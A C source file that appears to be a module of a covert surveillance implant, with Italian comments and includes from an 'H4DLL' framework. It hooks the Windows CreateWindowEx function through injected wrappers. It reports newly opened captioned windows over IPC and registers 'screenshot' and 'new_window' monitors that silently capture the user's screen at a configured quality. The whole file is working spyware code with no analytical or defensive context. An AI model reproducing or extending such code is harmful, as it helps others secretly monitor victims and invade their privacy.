#define _CRT_SECURE_NO_WARNINGS 1

#include <Windows.h>
#include <cJSON/cJSON.h>
#include "../../H4DLL/common.h"
#include "../../H4DLL/H4-DLL.h"
#include "../../H4DLL/bss.h"
#include "../../H4DLL/AM_Core.h"
#include "../../H4DLL/HM_IpcModule.h"
#include "../../H4DLL/HM_InbundleHook.h"
#include "../../H4DLL/config.h"

#include "screenshot.h"

void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);

extern BOOL g_newwindow_created;

#define SNAP_IMG_QUALITY_LOW 10
#define SNAP_IMG_QUALITY_MED 50
#define SNAP_IMG_QUALITY_HI 100

BOOL capture_only_window = FALSE;
DWORD image_quality = SNAP_IMG_QUALITY_MED;

CreateWindowExStruct CreateWindowExData;

HWND WINAPI PM_CreateWindowEx(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName,
	DWORD dwStyle,
	int x,
	int y,
	int nWidth,
	int nHeight,
	HWND hWndParent,
	HMENU hMenu,
	HINSTANCE hInstance,
	LPVOID lpParam) 
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(CreateWindowExStruct)
	CALL_ORIGINAL_API(12)

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_ONNEWWINDOW_IPC);
	// Controlla se il monitor e' attivo e se la funzione e' andata a buon fine
	if (!Active || !(*Active) || !ret_code)
		return (HWND)ret_code;

	if ( (dwStyle&WS_CAPTION)==WS_CAPTION || (dwStyle&WS_EX_MDICHILD)==WS_EX_MDICHILD)
		pData->pHM_IpcCliWrite(PM_ONNEWWINDOW_IPC, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
			
	return (HWND)ret_code;
}

DWORD WINAPI PM_CreateWindowEx_setup(HMServiceStruct *pData)
{
	CreateWindowExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	CreateWindowExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	CreateWindowExData.dwHookLen = 256;
	return 0;
}

// In realta' serve per l'evento on_new_window ma deve essere un dispatcher quindi l'ho lasciato qui
// per motivi "storici"...lo so fa cagare...
DWORD WINAPI PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
{
	char buff[1024];

	buff[0] = NULL;
	HM_SafeGetWindowTextA(*(HWND*)msg, buff, sizeof(buff));
	if (buff[0])  // Solo se ha il titolo
		g_newwindow_created = TRUE;
	return 1;
}

DWORD WINAPI PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
{
	if (bStartFlag && bReset) 
		TakeSnapShot(NULL, capture_only_window, image_quality);
	return 1;
}

DWORD WINAPI PM_SnapShotInit(cJSON* elem)
{
	cJSON* onlywindow = cJSON_GetObjectItem(elem, "onlywindow");
	
	image_quality = config_get_quality(elem);
	capture_only_window = cJSON_IsTrue(onlywindow);
	return 1;
}

void PM_SnapShotRegister()
{
	AM_MonitorRegister("screenshot", PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
	AM_MonitorRegister("new_window", PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
}
